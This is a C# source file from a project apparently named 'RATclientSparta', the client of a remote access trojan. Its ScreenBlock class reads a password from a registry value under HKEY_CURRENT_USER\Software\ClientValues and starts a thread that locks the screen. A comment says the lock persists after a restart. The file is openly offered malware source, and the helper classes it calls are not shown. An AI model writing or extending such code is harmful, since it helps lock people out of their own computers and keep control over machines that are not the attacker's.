using RATclientSparta.Setup.RegistryData;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RATclientSparta.Tools.Screen
{
    public class ScreenBlock
    {
        public void CheckIfLockRequired()
        {
            //Feature that locks the computer, Its using registry, So it will work even after computer restart.
            RegistryCheck check = new RegistryCheck();
            if (check.CheckIfExist("ScreenLock"))
            {
                RegistryGet get = new RegistryGet();
                //Decoding the password
                string password = Encoding.ASCII.GetString(get.Get(@"HKEY_CURRENT_USER\Software\ClientValues", "ScreenLock"));
                new Thread(new ThreadStart(() =>
                {
                    ScreenLock ScreenLock = new ScreenLock(password);
                })).Start();
            }
        }
    }
}
